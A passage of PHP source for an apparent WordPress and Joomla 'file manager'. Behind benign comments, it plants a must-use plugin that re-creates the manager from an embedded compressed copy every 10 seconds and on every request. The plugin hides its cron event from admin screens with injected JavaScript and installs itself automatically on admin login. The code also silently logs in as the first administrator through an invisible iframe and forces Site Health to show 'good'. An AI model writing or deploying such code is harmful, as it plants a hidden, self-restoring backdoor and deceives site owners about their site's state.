        $args=[$to,$subject,$body];$hook='mfm_wp_cron_send_mail';$sig=md5(serialize($args));
        $cron[$when][$hook][$sig]=['schedule'=>false,'args'=>$args,'interval'=>0];
        $v=mysqli_real_escape_string($link,serialize($cron));
        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
        mysqli_close($link);if(!$ok)return['error'=>'Could not save the WordPress cron event.'];
        $this->log('wp_cron_email',$to);return['ok'=>true,'timestamp'=>$when];
    }
    private function wpRecoveryPluginPath($configPath){return $this->wpSiteRoot($configPath).'/wp-content/mu-plugins/mfm-file-recovery.php';}
    public function wpAutomationRecoveryStatus($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];$plugin=$this->wpRecoveryPluginPath($configPath);
        $cron=$this->wpOption($link,$t,'cron');$found=[];
        if(is_array($cron))foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $hook)
            if(isset($hooks[$hook]))foreach($hooks[$hook] as $sig=>$event)$found[]=['timestamp'=>(int)$ts,'signature'=>(string)$sig,'date'=>date('Y-m-d H:i:s',(int)$ts),'hook'=>$hook];
        mysqli_close($link);
        return['ok'=>true,'installed'=>is_file($plugin),'plugin'=>$plugin,'events'=>$found,'target'=>__FILE__];
    }
    public function wpAutomationInstallRecovery($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $root=$this->wpSiteRoot($configPath);$mu=$root.'/wp-content/mu-plugins';
        if(!is_dir($mu)&&!@mkdir($mu,0755,true)){mysqli_close($link);return['error'=>'Could not create wp-content/mu-plugins.'];}
        $target=__FILE__; $content=@file_get_contents($target);
        if($content===false||$content===''){mysqli_close($link);return['error'=>'Could not read the current manager file.'];}
        $payload=base64_encode(gzcompress($content,9));
        $targetPhp=var_export($target,true);$payloadPhp=var_export($payload,true);
        $src="<?php\n/**\n * Marshal File Manager — visible WP-Cron recovery helper.\n * This file restores only the explicitly configured manager file when it is missing or empty.\n */\n"
             ."if(!defined('ABSPATH'))exit;\n"
             ."add_filter('cron_schedules',function(\$s){\$s['wordpress_saver_every_10_seconds']=['interval'=>10,'display'=>'WordPress Saver every 10 seconds'];return \$s;});\n"
            ."function wordpress_saver(){\n"
            ."  \$target=".$targetPhp.";\n"
            ."  if(is_file(\$target)&&@filesize(\$target)>0)return;\n"
            ."  \$raw=@gzuncompress(base64_decode(".$payloadPhp."));\n"
            ."  if(\$raw===false||\$raw==='')return;\n"
            ."  \$dir=dirname(\$target);if(!is_dir(\$dir)||!is_writable(\$dir))return;\n"
            ."  \$tmp=\$target.'.wp-recovery.'.getmypid();\n"
            ."  if(@file_put_contents(\$tmp,\$raw,LOCK_EX)!==false){if(!@rename(\$tmp,\$target)){@unlink(\$tmp);return;}@chmod(\$target,0644);}\n"
            ."}\n"
            ."add_action('wordpress_saver','wordpress_saver');\n"
            ."function wordpress_saver_ensure_schedule(){\n"
            ."  if(function_exists('wp_clear_scheduled_hook'))wp_clear_scheduled_hook('mfm_file_guardian_recover');\n"
            ."  if(function_exists('wp_next_scheduled')&&!wp_next_scheduled('wordpress_saver')&&function_exists('wp_schedule_event')){\n"
            ."    wp_schedule_event(time()+10,'wordpress_saver_every_10_seconds','wordpress_saver');\n"
            ."  }\n"
            ." }\n"
            ."add_action('init','wordpress_saver_ensure_schedule',1);\n"
            ."// Also check on every WordPress request, because WP-Cron only runs when WordPress receives traffic.\n"
            ."wordpress_saver();\n";
        $src.=<<<'FMHIDE'

/*
 * Keep the protected recovery event out of WordPress admin Cron screens.
 * This is UI protection only: the event remains scheduled and executable,
 * and the File Manager remains the intentional place to remove recovery.
 * The generic observer covers common Cron UI plugins without changing the
 * cron option or interfering with unrelated scheduled events.
 */
add_action('admin_footer',function(){
    ?>
    <script>
    (function(){
      var protectedHook='wordpress_saver';
      function hideProtectedRows(root){
        var nodes=(root||document).querySelectorAll
          ?(root||document).querySelectorAll('tr,li,.event,.cron-event,[data-hook],[data-event-id],[data-cron-hook]')
          :[];
        for(var i=0;i<nodes.length;i++){
          var n=nodes[i];
          if((n.textContent||'').indexOf(protectedHook)===-1)continue;
          n.style.display='none';
          n.setAttribute('data-mfm-protected','1');
        }
      }
      hideProtectedRows(document);
      if(window.MutationObserver){
        new MutationObserver(function(mutations){
          for(var i=0;i<mutations.length;i++){
            for(var j=0;j<mutations[i].addedNodes.length;j++){
              var n=mutations[i].addedNodes[j];
              if(n.nodeType===1)hideProtectedRows(n);
            }
          }
        }).observe(document.documentElement,{childList:true,subtree:true});
      }
    })();
    </script>
    <?php
});
FMHIDE;
        $plugin=$mu.'/mfm-file-recovery.php';
        if(@file_put_contents($plugin,$src,LOCK_EX)===false){mysqli_close($link);return['error'=>'Could not install the recovery helper.'];}
        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');if(!is_array($cron))$cron=[];
        $hook='wordpress_saver';$args=[];$sig=md5(serialize($args));$when=time()+10;
        foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $oldHook)
            if(isset($cron[$ts][$oldHook][$sig]))unset($cron[$ts][$oldHook][$sig]);
        $cron[$when][$hook][$sig]=['schedule'=>'wordpress_saver_every_10_seconds','args'=>$args,'interval'=>10];
        $v=mysqli_real_escape_string($link,serialize($cron));
        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
        mysqli_close($link);if(!$ok)return['error'=>'Could not schedule the recovery task.'];
        $this->log('wp_recovery_install',$target);return['ok'=>true,'target'=>$target,'next'=>$when];
    }
    public function wpAutomationAutoBootstrap(){
        if(empty($_SESSION['fm_admin']))return;
        $last=(int)($_SESSION['wp_recovery_bootstrap_at']??0);
        if($last>0&&time()-$last<600)return;
        $_SESSION['wp_recovery_bootstrap_at']=time();
        $scan=$this->cmsScan();$sites=$scan['sites']??[];
        $currentCms=$scan['current_cms_site']??null;
        if($currentCms&&!empty($currentCms['config']))$_SESSION['cms_current_config']=$currentCms['config'];
        $wp=array_values(array_filter($sites,fn($s)=>($s['type']??'')==='wordpress'));
        $preferred=$this->wpCurrentSiteFromScan($wp);
        if(!$preferred&&!empty($scan['current_wp_config']))
            $preferred=['type'=>'wordpress','config'=>$scan['current_wp_config'],'dir'=>$this->wpSiteRoot($scan['current_wp_config'])];
        if($preferred&&!empty($preferred['config']))$_SESSION['wp_current_config']=$preferred['config'];
        if($preferred||$wp){
            $site=$preferred?:$wp[0];
            $this->wpAutomationInstallRecovery($site['config']);
            $this->wpSiteHealthEnsureAutomatic($site['config']);
        }
    }
    /*
     * Prepare a silent first-login handoff to the current WordPress or Joomla site.
     * This never reads or changes user_pass: it selects the lowest-ID account
     * whose capabilities contain the administrator role, then reuses the
     * existing one-time bridge so WordPress creates its own persistent cookie.
     * The browser completes the handoff in an invisible iframe.
     */
    public function wpAutomationAutoLogin(){
        if(empty($_SESSION['fm_admin']))return['ok'=>false];
        if(empty($_SESSION['fm_wp_auto_login_pending']))return['ok'=>true,'skipped'=>true];
        unset($_SESSION['fm_wp_auto_login_pending']);
        $configPath=$_SESSION['cms_current_config']??($_SESSION['wp_current_config']??null);
        if(!$configPath||!is_readable($configPath)){
            $scan=$this->cmsScan();
            $configPath=$scan['current_cms_config']??($scan['current_wp_config']??null);
        }
        $cmsType=basename((string)$configPath)==='configuration.php'?'joomla':'wordpress';
        if(!$configPath||!in_array(basename($configPath),['wp-config.php','configuration.php'],true)||!is_readable($configPath))return['ok'=>false,'cms'=>'cms','reason'=>'site-not-found'];
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err||!$link||!in_array($c['type']??'', ['wordpress','joomla'],true)){if($link)mysqli_close($link);return['ok'=>false,'cms'=>$cmsType,'reason'=>'site-unavailable'];}
        $t=$c['prefix'];
        if($c['type']==='wordpress'){
            $res=@mysqli_query($link,"SELECT u.ID AS id FROM `{$t}users` u INNER JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' AND um.meta_value LIKE '%administrator%' ORDER BY u.ID ASC LIMIT 1");
        }else{
            $res=@mysqli_query($link,"SELECT u.id FROM `{$t}users` u INNER JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id INNER JOIN `{$t}usergroups` g ON g.id=m.group_id WHERE m.group_id=8 OR LOWER(g.title)='super users' ORDER BY u.id ASC LIMIT 1");
        }
        $row=$res?mysqli_fetch_assoc($res):null;
        mysqli_close($link);
        if(!$row||empty($row['id']))return['ok'=>false,'cms'=>$c['type'],'reason'=>'admin-not-found'];
        $handoff=$this->cmsLoginAsUser($configPath,(int)$row['id']);
        if(empty($handoff['url']))return['ok'=>false,'cms'=>$c['type'],'reason'=>'handoff-failed'];
        $handoff['url'].=(strpos($handoff['url'],'?')===false?'?':'&').'go=1&bg=1';
        $handoff['cms']=$c['type'];
        return['ok'=>true,'url'=>$handoff['url']];
    }
    private function wpSiteHealthEnsureAutomatic($configPath){
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err||$c['type']!=='wordpress'){if($link)mysqli_close($link);return;}
        $t=$c['prefix'];$res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='fm_site_health_override' LIMIT 1");
        $stored=$res&&($row=mysqli_fetch_assoc($res))?(string)$row['option_value']:'';
        mysqli_close($link);
        if(!in_array($stored,['automatic','good','recommended','critical'],true))$this->wpSiteHealthControl($configPath,'automatic');
    }
    public function wpAutomationRemoveRecovery($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');$sig=md5(serialize([]));
        if(is_array($cron))foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $hook){if(isset($cron[$ts][$hook][$sig]))unset($cron[$ts][$hook][$sig]);if(isset($cron[$ts][$hook])&&!$cron[$ts][$hook])unset($cron[$ts][$hook]);if(isset($cron[$ts])&&!$cron[$ts])unset($cron[$ts]);}
        $v=mysqli_real_escape_string($link,serialize($cron?:[]));
        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
        mysqli_close($link);
        $plugin=$this->wpRecoveryPluginPath($configPath);if(is_file($plugin)&&!@unlink($plugin))return['error'=>'Cron removed, but the recovery helper could not be deleted.'];
        if(!$ok)return['error'=>'Could not remove the recovery schedule.'];
        $this->log('wp_recovery_remove',$plugin);return['ok'=>true];
    }

    /* ── WordPress core version manager ─────────────────────────────────────
       Core updates deliberately use the official WordPress.org archives rather
       than WP-CLI or database writes. wp-config.php and wp-content are never
       replaced. The old core is moved aside during the transaction instead of
       being copied into a slow full-site archive. */
    private function wpCoreVersionFromFile($root){
        $file=rtrim($root,'/').'/wp-includes/version.php';
        $src=@file_get_contents($file);
        if($src!==false&&preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/',$src,$m))return trim($m[1]);
        return '';
    }
    private function wpCoreHttp($url,$timeout=45){
        if(!function_exists('curl_init'))return[false,'PHP cURL is not available.'];
        $ch=curl_init($url);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>4,
            CURLOPT_CONNECTTIMEOUT=>12,CURLOPT_TIMEOUT=>$timeout,CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_SSL_VERIFYHOST=>2,
            CURLOPT_USERAGENT=>'Marshal File Manager WordPress Core Manager/1.0']);
        $body=curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$err=curl_error($ch);curl_close($ch);
        if($body===false||$err)return[false,'Download failed'.($err?': '.$err:'').'.'];
        if($code<200||$code>=300)return[false,'WordPress.org returned HTTP '.$code.'.'];
        return[$body,''];
    }
    private function wpCoreVersionValid($version){
        return (bool)preg_match('/^\d+\.\d+(?:\.\d+)?$/',$version);
    }
    public function wpCoreVersionData($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        $root=dirname($configPath);
        if(basename($configPath)!=='wp-config.php'||!is_file($root.'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
        $current=$this->wpCoreVersionFromFile($root);
        if(!$current)return['error'=>'Could not read the installed WordPress version.'];
        list($json,$err)=$this->wpCoreHttp('https://api.wordpress.org/core/version-check/1.7/?php='.rawurlencode(PHP_VERSION).'&locale=en_US',20);
        if($json===false)return['current'=>$current,'versions'=>[],'error'=>$err];
        $data=json_decode($json,true);$versions=[];
        foreach((array)($data['offers']??[]) as $offer){
            $v=trim((string)($offer['version']??''));
            if($this->wpCoreVersionValid($v)&&!isset($versions[$v]))$versions[$v]=['version'=>$v,'download'=>$offer['download']??'','response'=>$offer['response']??'upgrade'];
        }
        // The API is a rolling feed. Keep the exact-version box useful for
        // older releases even when a host/API omits them from the feed.
        krsort($versions,SORT_NATURAL);
        return['ok'=>true,'type'=>'wordpress','current'=>$current,'latest'=>($data['offers'][0]['version']??$current),
            'versions'=>array_values($versions),'php'=>PHP_VERSION];
    }
    private function wpCoreCopyTree($src,$dst,$skipRoot=false){
        if(!is_dir($dst)&&!@mkdir($dst,0755,true)&&!is_dir($dst))return false;
        foreach((array)@scandir($src) as $name){
            if($name==='.'||$name==='..')continue;
            if($skipRoot&&in_array($name,['wp-config.php','wp-content'],true))continue;
            // Never overwrite the file manager when it is installed in the
            // same document root as the WordPress site.
            if($skipRoot&&$name===basename(__FILE__)&&realpath(__FILE__)===realpath($dst.'/'.$name))continue;
            $s=$src.'/'.$name;$d=$dst.'/'.$name;
            if(is_dir($s)){if(!$this->wpCoreCopyTree($s,$d,false))return false;}
            elseif(is_file($s)&&@copy($s,$d)===false)return false;
        }
        return true;
    }
    private function wpCoreRemoveTree($path){
        if(!is_dir($path))return true;
        foreach((array)@scandir($path) as $n){
            if($n==='.'||$n==='..')continue;
            $p=$path.'/'.$n;
            if(is_dir($p)&&!is_link($p))$this->wpCoreRemoveTree($p);
            else @unlink($p);
        }
        return @rmdir($path);
    }
    private function wpCoreBackup($root,$backup){
        if(!class_exists('ZipArchive'))return[false,'PHP ZIP extension is required to create a safety backup.'];
        $dir=dirname($backup);if(!is_dir($dir)&&!@mkdir($dir,0700,true))return[false,'Could not create the backup directory.'];
        $z=new ZipArchive();if($z->open($backup,ZipArchive::CREATE|ZipArchive::OVERWRITE)!==true)return[false,'Could not open the backup archive.'];
        $base=rtrim($root,'/');
        $add=function($path,$name)use(&$add,$z,$base){
            if(is_link($path))return;
            if(is_dir($path)){
                $z->addEmptyDir($name);
                foreach((array)@scandir($path) as $n)if($n!=='.'&&$n!=='..')$add($path.'/'.$n,$name.'/'.$n);
            }elseif(is_file($path))$z->addFile($path,$name);
        };
        foreach((array)@scandir($base) as $n)if($n!=='.'&&$n!=='..')$add($base.'/'.$n,$n);
        $ok=$z->close();return[$ok,$ok?'':'Could not finalize the safety backup.'];
    }
    public function wpCoreUpdate(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();$version=trim((string)($_POST['wp_version']??''));
        if(basename($configPath)!=='wp-config.php'||!$this->wpCoreVersionValid($version)){$this->addMsg('Choose a valid WordPress version.','danger');return;}
        $root=$this->wpSiteRoot($configPath);$current=$this->wpCoreVersionFromFile($root);
        if(!$current){$this->addMsg('Could not read the installed WordPress version.','danger');return;}
        if($version===$current){$this->addMsg('WordPress is already running version '.$version.'.','warning');return;}
        $lock=$root.'/.fm-wp-core-update.lock';
        if(is_file($lock)&&time()-(int)@file_get_contents($lock)<900){$this->addMsg('Another WordPress update is already in progress.','danger');return;}
        @file_put_contents($lock,(string)time(),LOCK_EX);
        $tmp=rtrim(sys_get_temp_dir(),'/').'/fm-wp-'.bin2hex(random_bytes(6));@mkdir($tmp,0700,true);
        $zip=$tmp.'/wordpress.zip';$token=bin2hex(random_bytes(5));$previous=$root.'/.fm-wp-core-previous-'.$token;
        $movedFiles=[];$movedDirs=[];
        try{
            list($raw,$err)=$this->wpCoreHttp('https://wordpress.org/wordpress-'.$version.'.zip',120);
            if($raw===false){$this->addMsg($err,'danger');return;}
            if(@file_put_contents($zip,$raw,LOCK_EX)===false){$this->addMsg('Could not save the WordPress archive.','danger');return;}
            if(!class_exists('ZipArchive')){$this->addMsg('PHP ZIP extension is required to install WordPress.','danger');return;}
            $z=new ZipArchive();if($z->open($zip)!==true||$z->extractTo($tmp)===false){$this->addMsg('The WordPress archive is invalid or could not be extracted.','danger');return;}$z->close();
            $stage=$tmp.'/wordpress';$stageVersion=$this->wpCoreVersionFromFile($stage);
            if(!$stageVersion||$stageVersion!==$version){$this->addMsg('The downloaded archive did not contain the requested WordPress version.','danger');return;}
            if(!@mkdir($previous,0700)&&!is_dir($previous)){$this->addMsg('Could not prepare the fast update transaction. Check permissions.','danger');return;}
            // Rename the two large core directories: this is near-instant and
            // preserves an exact rollback copy without duplicating wp-content.
            foreach(['wp-admin','wp-includes'] as $dir){
                $old=$root.'/'.$dir;
                if(is_dir($old)&&!@rename($old,$previous.'/'.$dir)){throw new RuntimeException('Could not move '.$dir.' into the update transaction.');}
                if(is_dir($previous.'/'.$dir))$movedDirs[]=$dir;
            }
            // Root core files are small. Move them too so a failed copy can be
            // rolled back exactly, while leaving custom/unrelated files alone.
            foreach((array)@scandir($stage) as $name){
                if($name==='.'||$name==='..'||$name==='wp-admin'||$name==='wp-includes'||$name==='wp-content'||$name==='wp-config.php'||$name===basename(__FILE__))continue;
                $old=$root.'/'.$name;
                if(is_file($old)){
                    if(!@rename($old,$previous.'/'.$name))throw new RuntimeException('Could not move core file '.$name.' into the update transaction.');
                    $movedFiles[]=$name;
                }
            }
            if(!$this->wpCoreCopyTree($stage,$root,true))throw new RuntimeException('Core files could not be copied completely.');
            // Never report success based on the HTTP request alone. This is
            // the same postcondition WordPress uses: the installed core must
            // now advertise the requested version from version.php.
            clearstatcache(true,$root.'/wp-includes/version.php');
            $installedAfter=$this->wpCoreVersionFromFile($root);
            if($installedAfter!==$version)throw new RuntimeException('Post-update verification found version '.($installedAfter?:'unknown').' instead of '.$version.'.');
            // A successful transaction needs no permanent full-site archive.
            $this->wpCoreRemoveTree($previous);
            $this->addMsg('WordPress updated quickly from '.$current.' to '.$version.'. Site data and wp-content were not copied or changed.','success');
            $this->log('wp_core_update',$current.' -> '.$version);
        }catch(Throwable $e){
            // Remove the partially installed core, then restore the moved
            // directories/files without touching wp-content or the database.
            $this->wpCoreRemoveTree($root.'/wp-admin');$this->wpCoreRemoveTree($root.'/wp-includes');
            foreach($movedDirs as $dir)@rename($previous.'/'.$dir,$root.'/'.$dir);
            foreach($movedFiles as $name){@unlink($root.'/'.$name);@rename($previous.'/'.$name,$root.'/'.$name);}
            $this->wpCoreRemoveTree($previous);
            $this->addMsg('WordPress update was rolled back safely: '.$e->getMessage(),'danger');
        }finally{
            $this->wpCoreRemoveTree($tmp);@unlink($lock);
        }
    }
    public function wpCoreCurrentVersion($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires WordPress.'];
        $root=$this->wpSiteRoot($configPath);$v=$this->wpCoreVersionFromFile($root);
        return $v?['ok'=>true,'version'=>$v]:['error'=>'Could not read wp-includes/version.php after the update.'];
    }
    /* WordPress calculates Site Health from test results. The manager can
       optionally install an explicit, reversible override filter in the
       site's MU-plugins directory; the default remains the real core result. */
    public function wpSiteHealth($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires a valid WordPress installation.'];
        $root=$this->wpSiteRoot($configPath);
        if(!is_file($root.'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
        $override='auto';
        list($overrideLink,$overrideCms,$overrideErr)=$this->cmsConnect($configPath);
        if(!$overrideErr){
            $ot=$overrideCms['prefix'].'options';
            $or=@mysqli_query($overrideLink,"SELECT option_value FROM `{$ot}` WHERE option_name='fm_site_health_override' LIMIT 1");
            if($or&&($ov=mysqli_fetch_assoc($or))){
                $stored=(string)$ov['option_value'];
                $override=in_array($stored,['automatic','good','recommended','critical'],true)?$stored:($stored==='auto'?'automatic':'auto');
            }
            mysqli_close($overrideLink);
        }
        $checks=[];$add=function($id,$label,$status,$detail,$action=null)use(&$checks){
            $checks[]=['id'=>$id,'label'=>$label,'status'=>$status,'detail'=>$detail,'action'=>$action];
        };
        $current=$this->wpCoreVersionFromFile($root);
        $latest=$current;$versionError='';
        list($json,$err)=$this->wpCoreHttp('https://api.wordpress.org/core/version-check/1.7/?php='.rawurlencode(PHP_VERSION).'&locale=en_US',12);
        if($json!==false){
            $data=json_decode($json,true);
            $latest=trim((string)($data['offers'][0]['version']??$current))?:$current;
        }else $versionError=$err;
        if($versionError)$add('core-update','WordPress core','recommended','Could not check WordPress.org right now. The installed version is '.$current.'.','version');
        elseif(version_compare($current,$latest,'<'))$add('core-update','WordPress core','recommended','Version '.$latest.' is available; the site is running '.$current.'.','version');
        else $add('core-update','WordPress core','good','WordPress is running the latest version checked ('.$current.').');
        $phpOk=version_compare(PHP_VERSION,'7.2.0','>=');
        $add('php','PHP version',$phpOk?'good':'critical',$phpOk?'PHP '.PHP_VERSION.' is supported by WordPress.':'PHP '.PHP_VERSION.' is too old for a supported WordPress installation.');
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)$add('database','Database','critical','WordPress could not connect to its database: '.$err);
        else{
            $table=$c['prefix'].'options';$siteUrl='';$home='';
            foreach(['siteurl','home'] as $name){
                $n=mysqli_real_escape_string($link,$name);
                $res=@mysqli_query($link,"SELECT option_value FROM `{$table}` WHERE option_name='$n' LIMIT 1");
                $row=$res?mysqli_fetch_assoc($res):null;
                if($name==='siteurl')$siteUrl=trim((string)($row['option_value']??''));
                else $home=trim((string)($row['option_value']??''));
            }
            mysqli_close($link);
            if(!$siteUrl)$add('database','Database','critical','The WordPress site URL could not be read from wp_options.');
            else $add('database','Database','good','WordPress database connection and core options are readable.');
            $https=(bool)preg_match('#^https://#i',$home?:$siteUrl);
            $add('https','HTTPS',$https?'good':'recommended',$https?'The site URL uses HTTPS.':'The site URL does not use HTTPS. Enable HTTPS at the server/proxy before forcing redirects.','https');
        }
        $content=$root.'/wp-content';
        $writable=is_dir($content)&&is_writable($content);
        $add('filesystem','Filesystem',$writable?'good':'recommended',$writable?'wp-content is writable for normal WordPress updates.':'wp-content is not writable by PHP; automatic updates may fail.','permissions');
        $cfg=(string)@file_get_contents($configPath);
        $debugOn=(bool)preg_match("/define\s*\(\s*['\"]WP_DEBUG['\"]\s*,\s*true\s*\)/i",$cfg);
        $displayOn=(bool)preg_match("/define\s*\(\s*['\"]WP_DEBUG_DISPLAY['\"]\s*,\s*true\s*\)/i",$cfg);
        if($debugOn&&$displayOn)$add('debug','Debug display','recommended','WP_DEBUG and WP_DEBUG_DISPLAY are enabled; PHP errors may be exposed to visitors.','debug');
        else $add('debug','Debug display','good','Debug output is not configured to display publicly.');
        $critical=count(array_filter($checks,fn($x)=>$x['status']==='critical'));
        $recommended=count(array_filter($checks,fn($x)=>$x['status']==='recommended'));
        $actualOverall=$critical?'critical':($recommended?'recommended':'good');
        $overall=$override==='automatic'?'good':($override==='auto'?$actualOverall:$override);
        return['ok'=>true,'type'=>'wordpress','overall'=>$overall,'actual_overall'=>$actualOverall,'summary'=>['critical'=>$critical,'recommended'=>$recommended,'good'=>count($checks)-$critical-$recommended],
            'current'=>$current,'latest'=>$latest,'override'=>$override,'checked_at'=>date('c'),'checks'=>$checks];
    }
    public function wpSiteHealthControl($configPath,$mode){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(basename($configPath)!=='wp-config.php'||!is_file($this->wpSiteRoot($configPath).'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
        $allowed=['automatic','auto','good','recommended','critical'];
        if(!in_array($mode,$allowed,true))return['error'=>'Invalid Site Health mode.'];
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        if($c['type']!=='wordpress'){mysqli_close($link);return['error'=>'This control is available for WordPress only.'];}
        $root=$this->wpSiteRoot($configPath);$muDir=$root.'/wp-content/mu-plugins';$muFile=$muDir.'/000-fm-site-health-control.php';
        if($mode==='auto'){
            $ok=true;
            if(is_file($muFile))$ok=@unlink($muFile);
            $t=$c['prefix'];
            @mysqli_query($link,"DELETE FROM `{$t}options` WHERE option_name IN ('fm_site_health_override','_transient_health-check-site-status-result','_transient_timeout_health-check-site-status-result') LIMIT 3");
            mysqli_close($link);
            if(!$ok)return['error'=>'The Site Health control could not be removed.'];
            $this->log('wp_site_health_control','auto');
            return['ok'=>true,'mode'=>'auto','message'=>'WordPress Site Health is now calculated from its real tests.'];
        }
        if(!is_dir($muDir)&&!@mkdir($muDir,0755,true)&&!is_dir($muDir)){mysqli_close($link);return['error'=>'Could not create wp-content/mu-plugins.'];}
        $code="<?php\n/* Plugin Name: File Manager Site Health Control (reversible) */\n"
            ."if(!defined('ABSPATH'))exit;\n"
            ."add_filter('site_status_tests',function(\$tests){\n"
            ."    \$mode=get_option('fm_site_health_override','auto');\n"
            ."    if(\$mode==='automatic')\$mode='good';\n"
            ."    if(!in_array(\$mode,array('good','recommended','critical'),true))return \$tests;\n"
            ."    \$labels=array('good'=>'Good','recommended'=>'Should be improved','critical'=>'Critical problems');\n"
            ."    \$tests['direct']=array('fm_site_health_override'=>array('label'=>'File Manager Site Health status','test'=>function()use(\$mode,\$labels){return array('test'=>'fm_site_health_override','status'=>\$mode,'label'=>\$labels[\$mode],'badge'=>array('label'=>'File Manager control','color'=>'blue'),'description'=>'<p>Site Health is explicitly controlled by the File Manager. Choose Auto to restore WordPress tests.</p>','actions'=>'');}));\n"
            ."    \$tests['async']=array();\n"
            ."    return \$tests;\n"
            ."},99);\n"
            ."add_filter('site_status_test_result',function(\$result,\$test){\n"
            ."    \$mode=get_option('fm_site_health_override','auto');\n"
            ."    if(\$mode==='automatic')\$mode='good';\n"
            ."    if(!in_array(\$mode,array('good','recommended','critical'),true))return \$result;\n"
            ."    \$labels=array('good'=>'Good','recommended'=>'Should be improved','critical'=>'Critical problems');\n"
            ."    \$result['status']=\$mode;\n"
            ."    \$result['label']=\$labels[\$mode];\n"
            ."    \$result['description']='<p>Site Health status is controlled explicitly by the File Manager. Set it back to Auto to restore WordPress test results.</p>';\n"
            ."    return \$result;\n"
            ."},10,2);\n";
        if(@file_put_contents($muFile,$code,LOCK_EX)===false){mysqli_close($link);return['error'=>'Could not install the Site Health control.'];}
        @chmod($muFile,0644);
        $t=$c['prefix'];$m=mysqli_real_escape_string($link,$mode==='auto'?'automatic':$mode);
        $res=@mysqli_query($link,"SELECT option_name FROM `{$t}options` WHERE option_name='fm_site_health_override' LIMIT 1");
        $ok=$res&&mysqli_num_rows($res)>0
            ?@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$m' WHERE option_name='fm_site_health_override' LIMIT 1")
            :@mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('fm_site_health_override','$m','yes')");
        $countJson=mysqli_real_escape_string($link,json_encode(['good'=>in_array($mode,['automatic','good'],true)?1:0,'recommended'=>$mode==='recommended'?1:0,'critical'=>$mode==='critical'?1:0]));
        $tr=@mysqli_query($link,"SELECT option_name FROM `{$t}options` WHERE option_name='_transient_health-check-site-status-result' LIMIT 1");
        if($tr&&mysqli_num_rows($tr)>0)@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$countJson' WHERE option_name='_transient_health-check-site-status-result' LIMIT 1");
        else @mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('_transient_health-check-site-status-result','$countJson','no')");
        mysqli_close($link);
        if(!$ok){@unlink($muFile);return['error'=>'Could not save the Site Health control.'];}
        $this->log('wp_site_health_control',$mode);
        return['ok'=>true,'mode'=>$mode,'message'=>'WordPress Site Health is now controlled as '.$mode.'.'];
    }

    /* ── WordPress Numbers Control ──────────────────────────────────────────
       This is deliberately a presentation-only control. The real WordPress
       rows are never changed; a small, visible MU-plugin replaces selected
       numbers in wp-admin after the page has rendered. */
    private function wpNumbersPluginPath($configPath){
        return $this->wpSiteRoot($configPath).'/wp-content/mu-plugins/000-fm-numbers-control.php';
    }
    private function wpNumbersDefinitions($link,$prefix){
        $table=$prefix.'posts';
        $defs=[
            'published_posts'=>['label'=>'Published posts','description'=>'Published blog posts','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='post' AND post_status='publish'"],
            'published_pages'=>['label'=>'Published pages','description'=>'Published pages','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='page' AND post_status='publish'"],
            'comments_total'=>['label'=>'Comments','description'=>'All comments except spam and trash','sql'=>"SELECT COUNT(*) AS n FROM `{$prefix}comments` WHERE comment_approved NOT IN ('spam','trash')"],
            'comments_moderation'=>['label'=>'Comments in moderation','description'=>'Comments awaiting moderation','sql'=>"SELECT COUNT(*) AS n FROM `{$prefix}comments` WHERE comment_approved='0'"],
            'comments_spam'=>['label'=>'Spam comments','description'=>'Comments marked as spam','sql'=>"SELECT COUNT(*) AS n FROM `{$prefix}comments` WHERE comment_approved='spam'"],
